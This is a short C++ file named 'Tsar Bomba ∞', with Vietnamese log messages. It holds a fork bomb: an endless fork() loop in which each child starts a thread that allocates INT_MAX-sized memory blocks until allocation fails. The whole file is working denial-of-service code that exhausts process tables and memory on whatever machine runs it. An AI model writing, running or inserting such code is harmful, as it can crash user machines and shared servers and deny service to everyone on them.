// this file is "Tsar Bomba ∞"
#include <iostream>
#include <vector>
#include <cstdlib>
#include <limits.h>
#include <unistd.h>
#include <thread>
int anothernuke() {
    std::vector<void*> phan_cap_phat;
    while (true) {
        void* ptr = malloc(INT_MAX);
        if (!ptr) {
            std::cout << "Cap phat that bai" << std::endl;
            break;
        }
        phan_cap_phat.push_back(ptr);
        std::cout << "Da cap phat them co... khong biet :D" << std::endl;
    }
    return 0;
}
int tsarbomba() {
    while (true) {
        if (fork() == 0) {
            std::thread(anothernuke).detach();
        }
    }
    return 0;
}
